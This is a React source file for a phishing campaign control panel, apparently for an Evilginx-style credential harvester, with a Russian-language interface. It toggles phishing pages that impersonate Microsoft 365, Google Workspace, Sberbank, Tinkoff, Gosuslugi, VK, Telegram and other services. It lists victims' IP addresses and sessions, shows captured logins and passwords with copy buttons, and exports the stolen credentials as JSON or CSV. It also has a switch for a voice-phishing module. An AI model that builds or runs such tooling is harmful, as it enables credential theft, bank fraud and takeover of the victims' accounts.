'use client'

import { useState, useEffect, useCallback } from 'react'
import { 
  Shield, Activity, Users, Key, AlertTriangle, CheckCircle, 
  Settings, Play, Pause, Trash2, Eye, Download, RefreshCw,
  ChevronRight, Info, Zap, Server, Globe, Clock, Copy,
  Check, X, Plus, Search, Filter
} from 'lucide-react'

// Types
interface Stats {
  total_sessions: number
  active_sessions: number
  total_credentials: number
  active_phishlets: number
  captured_sessions: number
  total_requests: number
}

interface Session {
  id: string
  victim_ip: string
  target_url: string
  phishlet_id: string
  user_agent: string
  state: string
  created_at: string
  last_active: string
}

interface Credential {
  id: string
  session_id: string
  username: string
  password: string
  captured_at: string
}

interface Phishlet {
  id: string
  name: string
  target_domain: string
  is_active: boolean
  enabled: boolean
}

interface LogEntry {
  id: string
  timestamp: string
  level: string
  message: string
  source: string
}

// API Functions
const API_BASE = '/api/v1'

async function apiCall(endpoint: string, options?: RequestInit) {
  const response = await fetch(`${API_BASE}${endpoint}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...options?.headers,
    },
  })
  if (!response.ok) throw new Error(`API Error: ${response.statusText}`)
  return response.json()
}

export default function SimpleDashboard() {
  const [activeTab, setActiveTab] = useState('dashboard')
  const [loading, setLoading] = useState(true)
  const [stats, setStats] = useState<Stats | null>(null)
  const [sessions, setSessions] = useState<Session[]>([])
  const [credentials, setCredentials] = useState<Credential[]>([])
  const [phishlets, setPhishlets] = useState<Phishlet[]>([])
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [error, setError] = useState<string | null>(null)

  // Fetch data
  const fetchData = useCallback(async () => {
    try {
      setError(null)
      const [statsData, sessionsData, credentialsData, phishletsData] = await Promise.all([
        apiCall('/stats'),
        apiCall('/sessions?limit=20'),
        apiCall('/credentials?limit=20'),
        apiCall('/phishlets'),
      ])
      
      setStats(statsData)
      setSessions(sessionsData.sessions || [])
      setCredentials(credentialsData.credentials || [])
      setPhishlets(phishletsData.phishlets || [])
    } catch (err) {
      console.error('Fetch error:', err)
      setError('Не удалось загрузить данные. Проверьте подключение к серверу.')
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    fetchData()
    const interval = setInterval(fetchData, 5000)
    return () => clearInterval(interval)
  }, [fetchData])

  // Toggle phishlet
  const togglePhishlet = async (id: string, enabled: boolean) => {
    try {
      const action = enabled ? 'disable' : 'enable'
      await apiCall(`/phishlets/${id}/${action}`, { method: 'POST' })
      fetchData()
    } catch (err) {
      console.error('Toggle error:', err)
    }
  }

  // Delete session
  const deleteSession = async (id: string) => {
    try {
      await apiCall(`/sessions/${id}`, { method: 'DELETE' })
      fetchData()
    } catch (err) {
      console.error('Delete error:', err)
    }
  }

  // Copy to clipboard
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  if (loading) {
    return <LoadingScreen />
  }

  return (
    <div className="min-h-screen bg-slate-900 text-white">
      {/* Header */}
      <header className="bg-slate-800 border-b border-slate-700 px-6 py-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <div className="flex items-center space-x-3">
            <div className="p-2 bg-blue-600 rounded-lg">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold">Evingix Control Panel</h1>
              <p className="text-xs text-slate-400">Управление фишинговой кампанией</p>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <button 
              onClick={fetchData}
              className="p-2 hover:bg-slate-700 rounded-lg transition-colors"
              title="Обновить"
            >
              <RefreshCw className="w-5 h-5" />
            </button>
            <div className="flex items-center space-x-2 px-3 py-1.5 bg-green-900/30 rounded-full">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span className="text-sm text-green-400">Система активна</span>
            </div>
          </div>
        </div>
      </header>

      {/* Error Banner */}
      {error && (
        <div className="bg-red-900/50 border-b border-red-700 px-6 py-3">
          <div className="max-w-7xl mx-auto flex items-center justify-between">
            <div className="flex items-center space-x-2 text-red-300">
              <AlertTriangle className="w-5 h-5" />
              <span>{error}</span>
            </div>
            <button onClick={() => setError(null)} className="text-red-400 hover:text-red-200">
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>
      )}

      {/* Navigation */}
      <nav className="bg-slate-800/50 border-b border-slate-700">
        <div className="max-w-7xl mx-auto px-6">
          <div className="flex space-x-1 overflow-x-auto">
            {[
              { id: 'dashboard', label: 'Главная', icon: Activity },
              { id: 'phishlets', label: 'Фишлеты', icon: Globe },
              { id: 'sessions', label: 'Сессии', icon: Users },
              { id: 'credentials', label: 'Данные', icon: Key },
              { id: 'logs', label: 'Логи', icon: Server },
              { id: 'settings', label: 'Настройки', icon: Settings },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center space-x-2 px-4 py-3 text-sm font-medium transition-colors whitespace-nowrap ${
                  activeTab === tab.id
                    ? 'text-blue-400 border-b-2 border-blue-400 bg-slate-800'
                    : 'text-slate-400 hover:text-white hover:bg-slate-700'
                }`}
              >
                <tab.icon className="w-4 h-4" />
                <span>{tab.label}</span>
              </button>
            ))}
          </div>
        </div>
      </nav>

      {/* Content */}
      <main className="max-w-7xl mx-auto px-6 py-8">
        {activeTab === 'dashboard' && (
          <DashboardView stats={stats} sessions={sessions} credentials={credentials} logs={logs} setLogs={setLogs} />
        )}
        {activeTab === 'phishlets' && (
          <PhishletsView phishlets={phishlets} onToggle={togglePhishlet} />
        )}
        {activeTab === 'sessions' && (
          <SessionsView sessions={sessions} onDelete={deleteSession} onCopy={copyToClipboard} />
        )}
        {activeTab === 'credentials' && (
          <CredentialsView credentials={credentials} onCopy={copyToClipboard} />
        )}
        {activeTab === 'logs' && (
          <LogsView logs={logs} setLogs={setLogs} />
        )}
        {activeTab === 'settings' && (
          <SettingsView />
        )}
      </main>
    </div>
  )
}

// Loading Screen
function LoadingScreen() {
  return (
    <div className="min-h-screen bg-slate-900 flex items-center justify-center">
      <div className="text-center">
        <div className="relative mb-4">
          <Shield className="w-16 h-16 text-blue-500 mx-auto animate-pulse" />
          <div className="absolute inset-0 bg-blue-500/20 blur-xl" />
        </div>
        <p className="text-blue-400 font-mono animate-pulse">Загрузка панели управления...</p>
      </div>
    </div>
  )
}

// Dashboard View
function DashboardView({ stats, sessions, credentials, logs, setLogs }: { 
  stats: Stats | null
  sessions: Session[]
  credentials: Credential[]
  logs: LogEntry[]
  setLogs: (logs: LogEntry[]) => void
}) {
  const recentCredentials = credentials.slice(0, 5)
  const recentSessions = sessions.slice(0, 5)

  return (
    <div className="space-y-6">
      {/* Stats Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <StatCard 
          icon={Users}
          label="Всего сессий"
          value={stats?.total_sessions || 0}
          color="blue"
          subtext={`${stats?.active_sessions || 0} активных`}
        />
        <StatCard 
          icon={Key}
          label="Перехвачено данных"
          value={stats?.total_credentials || 0}
          color="green"
          subtext="учётных записей"
        />
        <StatCard 
          icon={Globe}
          label="Активные фишлеты"
          value={stats?.active_phishlets || 0}
          color="purple"
          subtext="целей активно"
        />
        <StatCard 
          icon={Activity}
          label="Всего запросов"
          value={stats?.total_requests || 0}
          color="orange"
          subtext="обработано"
        />
      </div>

      {/* Quick Actions */}
      <div className="bg-slate-800 rounded-xl p-6">
        <h2 className="text-lg font-semibold mb-4">Быстрые действия</h2>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          <QuickAction 
            icon={Globe}
            label="Запустить фишлет"
            description="Активировать новую цель"
            color="blue"
          />
          <QuickAction 
            icon={Users}
            label="Просмотр сессий"
            description="Активные подключения"
            color="green"
          />
          <QuickAction 
            icon={Key}
            label="Экспорт данных"
            description="Сохранить результаты"
            color="purple"
          />
          <QuickAction 
            icon={Settings}
            label="Настройки"
            description="Конфигурация системы"
            color="orange"
          />
        </div>
      </div>

      {/* Recent Activity */}
      <div className="grid md:grid-cols-2 gap-6">
        {/* Recent Credentials */}
        <div className="bg-slate-800 rounded-xl p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold">Последние перехваченные данные</h2>
            <button className="text-blue-400 hover:text-blue-300 text-sm">Показать все</button>
          </div>
          {recentCredentials.length > 0 ? (
            <div className="space-y-3">
              {recentCredentials.map((cred) => (
                <div key={cred.id} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg">
                  <div>
                    <p className="font-mono text-sm">{cred.username}</p>
                    <p className="text-xs text-slate-400">{new Date(cred.captured_at).toLocaleString()}</p>
                  </div>
                  <button 
                    onClick={() => navigator.clipboard.writeText(cred.password)}
                    className="p-2 hover:bg-slate-600 rounded"
                    title="Копировать пароль"
                  >
                    <Copy className="w-4 h-4 text-slate-400" />
                  </button>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-slate-400 text-center py-8">Пока нет перехваченных данных</p>
          )}
        </div>

        {/* Recent Sessions */}
        <div className="bg-slate-800 rounded-xl p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold">Активные сессии</h2>
            <button className="text-blue-400 hover:text-blue-300 text-sm">Показать все</button>
          </div>
          {recentSessions.length > 0 ? (
            <div className="space-y-3">
              {recentSessions.map((session) => (
                <div key={session.id} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg">
                  <div className="flex items-center space-x-3">
                    <div className={`w-2 h-2 rounded-full ${session.state === 'active' ? 'bg-green-500' : 'bg-slate-500'}`} />
                    <div>
                      <p className="font-mono text-sm">{session.victim_ip}</p>
                      <p className="text-xs text-slate-400">{session.target_url || session.phishlet_id}</p>
                    </div>
                  </div>
                  <span className={`text-xs px-2 py-1 rounded ${session.state === 'active' ? 'bg-green-900 text-green-300' : 'bg-slate-600 text-slate-300'}`}>
                    {session.state}
                  </span>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-slate-400 text-center py-8">Нет активных сессий</p>
          )}
        </div>
      </div>
    </div>
  )
}

// Stat Card Component
function StatCard({ icon: Icon, label, value, color, subtext }: {
  icon: any
  label: string
  value: number
  color: string
  subtext: string
}) {
  const colors: Record<string, string> = {
    blue: 'bg-blue-500/20 text-blue-400',
    green: 'bg-green-500/20 text-green-400',
    purple: 'bg-purple-500/20 text-purple-400',
    orange: 'bg-orange-500/20 text-orange-400',
  }

  return (
    <div className="bg-slate-800 rounded-xl p-4 hover:bg-slate-700/50 transition-colors">
      <div className="flex items-center justify-between mb-3">
        <div className={`p-2 rounded-lg ${colors[color]}`}>
          <Icon className="w-5 h-5" />
        </div>
      </div>
      <p className="text-2xl font-bold">{value.toLocaleString()}</p>
      <p className="text-sm text-slate-400">{label}</p>
      <p className="text-xs text-slate-500 mt-1">{subtext}</p>
    </div>
  )
}

// Quick Action Component
function QuickAction({ icon: Icon, label, description, color }: {
  icon: any
  label: string
  description: string
  color: string
}) {
  const colors: Record<string, string> = {
    blue: 'hover:border-blue-500 hover:text-blue-400',
    green: 'hover:border-green-500 hover:text-green-400',
    purple: 'hover:border-purple-500 hover:text-purple-400',
    orange: 'hover:border-orange-500 hover:text-orange-400',
  }

  return (
    <button className={`p-4 bg-slate-700/50 rounded-xl border border-transparent ${colors[color]} transition-all text-left group`}>
      <Icon className="w-6 h-6 mb-2 opacity-60 group-hover:opacity-100" />
      <p className="font-medium">{label}</p>
      <p className="text-xs text-slate-400">{description}</p>
    </button>
  )
}

// Phishlets View
function PhishletsView({ phishlets, onToggle }: { 
  phishlets: Phishlet[] 
  onToggle: (id: string, enabled: boolean) => void 
}) {
  const getPhishletInfo = (name: string) => {
    const info: Record<string, { desc: string; icon: string }> = {
      microsoft_365: { desc: 'Microsoft Office 365', icon: '📧' },
      google_workspace: { desc: 'Google Workspace', icon: '📧' },
      sberbank: { desc: 'Сбербанк', icon: '🏦' },
      sberbank_business: { desc: 'Сбербанк Бизнес', icon: '🏦' },
      tinkoff_business: { desc: 'Тинькофф Бизнес', icon: '🏦' },
      gosuslugi: { desc: 'Госуслуги', icon: '🏛️' },
      yandex: { desc: 'Яндекс', icon: '🔍' },
      vk: { desc: 'ВКонтакте', icon: '💬' },
      telegram: { desc: 'Telegram', icon: '✈️' },
      instagram: { desc: 'Instagram', icon: '📷' },
      mailru: { desc: 'Mail.ru', icon: '📧' },
      ozon: { desc: 'Ozon', icon: '🛒' },
      wildberries: { desc: 'Wildberries', icon: '🛒' },
      tiktok: { desc: 'TikTok', icon: '🎵' },
      facebook: { desc: 'Facebook', icon: '📘' },
    }
    return info[name] || { desc: name, icon: '🌐' }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-semibold">Управление фишлетами</h2>
          <p className="text-sm text-slate-400">Активируйте или деактивируйте фишинговые страницы</p>
        </div>
      </div>

      {phishlets.length > 0 ? (
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
          {phishlets.map((phishlet) => {
            const info = getPhishletInfo(phishlet.name)
            return (
              <div 
                key={phishlet.id} 
                className={`bg-slate-800 rounded-xl p-4 border-2 transition-all ${
                  phishlet.enabled ? 'border-green-500/50' : 'border-transparent'
                }`}
              >
                <div className="flex items-start justify-between mb-3">
                  <div className="flex items-center space-x-3">
                    <span className="text-2">{info.icon}</span>
                    <div>
                      <h3 className="font-semibold">{info.desc}</h3>
                      <p className="text-xs text-slate-400 font-mono">{phishlet.name}</p>
                    </div>
                  </div>
                  <div className={`px-2 py-1 rounded text-xs font-medium ${
                    phishlet.enabled 
                      ? 'bg-green-900 text-green-300' 
                      : 'bg-slate-600 text-slate-300'
                  }`}>
                    {phishlet.enabled ? 'Активен' : 'Неактивен'}
                  </div>
                </div>
                
                <button
                  onClick={() => onToggle(phishlet.id, phishlet.enabled)}
                  className={`w-full py-2 rounded-lg font-medium transition-colors ${
                    phishlet.enabled
                      ? 'bg-red-600 hover:bg-red-700 text-white'
                      : 'bg-green-600 hover:bg-green-700 text-white'
                  }`}
                >
                  {phishlet.enabled ? 'Остановить' : 'Запустить'}
                </button>
              </div>
            )
          })}
        </div>
      ) : (
        <div className="bg-slate-800 rounded-xl p-12 text-center">
          <Globe className="w-12 h-12 text-slate-600 mx-auto mb-4" />
          <p className="text-slate-400">Нет доступных фишлетов</p>
        </div>
      )}
    </div>
  )
}

// Sessions View
function SessionsView({ sessions, onDelete, onCopy }: {
  sessions: Session[]
  onDelete: (id: string) => void
  onCopy: (text: string) => void
}) {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-semibold">Сессии</h2>
          <p className="text-sm text-slate-400">Активные и завершённые сессии жертв</p>
        </div>
        <div className="text-sm text-slate-400">
          Всего: {sessions.length} сессий
        </div>
      </div>

      {sessions.length > 0 ? (
        <div className="bg-slate-800 rounded-xl overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-slate-700/50">
                <tr>
                  <th className="px-4 py-3 text-left text-sm font-medium text-slate-400">IP адрес</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-slate-400">Цель</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-slate-400">Статус</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-slate-400">Время</th>
                  <th className="px-4 py-3 text-right text-sm font-medium text-slate-400">Действия</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                {sessions.map((session) => (
                  <tr key={session.id} className="hover:bg-slate-700/30">
                    <td className="px-4 py-3">
                      <div className="flex items-center space-x-2">
                        <code className="font-mono text-sm">{session.victim_ip}</code>
                        <button 
                          onClick={() => onCopy(session.victim_ip)}
                          className="p-1 hover:bg-slate-600 rounded"
                          title="Копировать"
                        >
                          <Copy className="w-3 h-3 text-slate-400" />
                        </button>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-sm text-slate-300">
                      {session.target_url || session.phishlet_id || '-'}
                    </td>
                    <td className="px-4 py-3">
                      <span className={`text-xs px-2 py-1 rounded ${
                        session.state === 'active' 
                          ? 'bg-green-900 text-green-300' 
                          : 'bg-slate-600 text-slate-300'
                      }`}>
                        {session.state === 'active' ? 'Активна' : 'Завершена'}
                      </span>
                    </td>
                    <td className="px-4 py-3 text-sm text-slate-400">
                      {new Date(session.created_at).toLocaleString()}
                    </td>
                    <td className="px-4 py-3 text-right">
                      <button
                        onClick={() => onDelete(session.id)}
                        className="p-2 hover:bg-red-600/20 rounded text-red-400"
                        title="Удалить"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      ) : (
        <div className="bg-slate-800 rounded-xl p-12 text-center">
          <Users className="w-12 h-12 text-slate-600 mx-auto mb-4" />
          <p className="text-slate-400">Нет активных сессий</p>
        </div>
      )}
    </div>
  )
}

// Credentials View
function CredentialsView({ credentials, onCopy }: {
  credentials: Credential[]
  onCopy: (text: string) => void
}) {
  const exportCredentials = (format: 'json' | 'csv') => {
    if (format === 'json') {
      const data = JSON.stringify(credentials, null, 2)
      const blob = new Blob([data], { type: 'application/json' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = 'credentials.json'
      a.click()
    } else {
      const csv = 'ID,Username,Password,Captured At\n' + 
        credentials.map(c => `${c.id},${c.username},${c.password},${c.captured_at}`).join('\n')
      const blob = new Blob([csv], { type: 'text/csv' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = 'credentials.csv'
      a.click()
    }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-semibold">Перехваченные данные</h2>
          <p className="text-sm text-slate-400">Учётные данные, полученные от жертв</p>
        </div>
        <div className="flex space-x-2">
          <button 
            onClick={() => exportCredentials('json')}
            className="flex items-center space-x-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 rounded-lg"
          >
            <Download className="w-4 h-4" />
            <span>JSON</span>
          </button>
          <button 
            onClick={() => exportCredentials('csv')}
            className="flex items-center space-x-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 rounded-lg"
          >
            <Download className="w-4 h-4" />
            <span>CSV</span>
          </button>
        </div>
      </div>

      {credentials.length > 0 ? (
        <div className="space-y-3">
          {credentials.map((cred) => (
            <div key={cred.id} className="bg-slate-800 rounded-xl p-4">
              <div className="flex items-start justify-between">
                <div className="flex-1 grid md:grid-cols-2 gap-4">
                  <div>
                    <label className="text-xs text-slate-500">Логин / Email</label>
                    <div className="flex items-center space-x-2 mt-1">
                      <code className="font-mono text-sm text-blue-400">{cred.username}</code>
                      <button 
                        onClick={() => onCopy(cred.username)}
                        className="p-1 hover:bg-slate-700 rounded"
                        title="Копировать"
                      >
                        <Copy className="w-3 h-3 text-slate-400" />
                      </button>
                    </div>
                  </div>
                  <div>
                    <label className="text-xs text-slate-500">Пароль</label>
                    <div className="flex items-center space-x-2 mt-1">
                      <code className="font-mono text-sm text-green-400">{cred.password}</code>
                      <button 
                        onClick={() => onCopy(cred.password)}
                        className="p-1 hover:bg-slate-700 rounded"
                        title="Копировать"
                      >
                        <Copy className="w-3 h-3 text-slate-400" />
                      </button>
                    </div>
                  </div>
                </div>
                <div className="text-right text-sm text-slate-500 ml-4">
                  {new Date(cred.captured_at).toLocaleString()}
                </div>
              </div>
            </div>
          ))}
        </div>
      ) : (
        <div className="bg-slate-800 rounded-xl p-12 text-center">
          <Key className="w-12 h-12 text-slate-600 mx-auto mb-4" />
          <p className="text-slate-400">Пока нет перехваченных данных</p>
        </div>
      )}
    </div>
  )
}

// Logs View
function LogsView({ logs, setLogs }: { logs: LogEntry[], setLogs: (logs: LogEntry[]) => void }) {
  const [filter, setFilter] = useState('')

  const filteredLogs = logs.filter(log => 
    filter === '' || log.message.toLowerCase().includes(filter.toLowerCase())
  )

  const getLevelColor = (level: string) => {
    switch (level.toLowerCase()) {
      case 'success':
        return 'text-green-400 bg-green-900/30'
      case 'warning':
        return 'text-yellow-400 bg-yellow-900/30'
      case 'error':
        return 'text-red-400 bg-red-900/30'
      default:
        return 'text-blue-400 bg-blue-900/30'
    }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-semibold">Системные логи</h2>
          <p className="text-sm text-slate-400">Журнал событий и активности системы</p>
        </div>
        <div className="flex items-center space-x-2">
          <Search className="w-4 h-4 text-slate-400" />
          <input
            type="text"
            placeholder="Поиск в логах..."
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            className="px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500"
          />
        </div>
      </div>

      <div className="bg-slate-800 rounded-xl p-4 h-[500px] overflow-y-auto font-mono text-sm">
        {filteredLogs.length > 0 ? (
          <div className="space-y-2">
            {filteredLogs.map((log) => (
              <div key={log.id} className="flex items-start space-x-3 p-2 hover:bg-slate-700/30 rounded">
                <span className="text-xs text-slate-500 whitespace-nowrap">
                  {new Date(log.timestamp).toLocaleTimeString()}
                </span>
                <span className={`text-xs px-2 py-0.5 rounded ${getLevelColor(log.level)}`}>
                  {log.level}
                </span>
                <span className="text-xs text-slate-500">[{log.source}]</span>
                <span className="text-slate-300">{log.message}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="text-center text-slate-400 py-12">
            <Server className="w-12 h-12 mx-auto mb-4 opacity-50" />
            <p>Нет записей в логах</p>
          </div>
        )}
      </div>
    </div>
  )
}

// Settings View
function SettingsView() {
  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-semibold">Настройки</h2>
        <p className="text-sm text-slate-400">Конфигурация системы</p>
      </div>

      <div className="bg-slate-800 rounded-xl p-6 space-y-6">
        <div>
          <h3 className="font-medium mb-4">Основные настройки</h3>
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-slate-400 mb-2">API Порт</label>
              <input 
                type="number" 
                defaultValue={8080}
                className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm text-slate-400 mb-2">HTTPS Порт</label>
              <input 
                type="number" 
                defaultValue={8443}
                className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-500"
              />
            </div>
            <div>
              <label className="block text-sm text-slate-400 mb-2">Домен</label>
              <input 
                type="text" 
                defaultValue="phantom.local"
                className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-500"
              />
            </div>
          </div>
        </div>

        <div className="pt-6 border-t border-slate-700">
          <h3 className="font-medium mb-4">API Ключ</h3>
          <div className="flex space-x-2">
            <input 
              type="password" 
              defaultValue="change-me-to-secure-random-string"
              className="flex-1 px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-500"
            />
            <button className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg">
              Сохранить
            </button>
          </div>
        </div>

        <div className="pt-6 border-t border-slate-700">
          <h3 className="font-medium mb-4">Дополнительные функции</h3>
          <div className="space-y-3">
            <label className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg cursor-pointer">
              <span>AI Анализ рисков</span>
              <input type="checkbox" defaultChecked className="w-5 h-5 rounded" />
            </label>
            <label className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg cursor-pointer">
              <span>Vishing модуль</span>
              <input type="checkbox" className="w-5 h-5 rounded" />
            </label>
            <label className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg cursor-pointer">
              <span>Режим отладки</span>
              <input type="checkbox" className="w-5 h-5 rounded" />
            </label>
          </div>
        </div>
      </div>
    </div>
  )
}
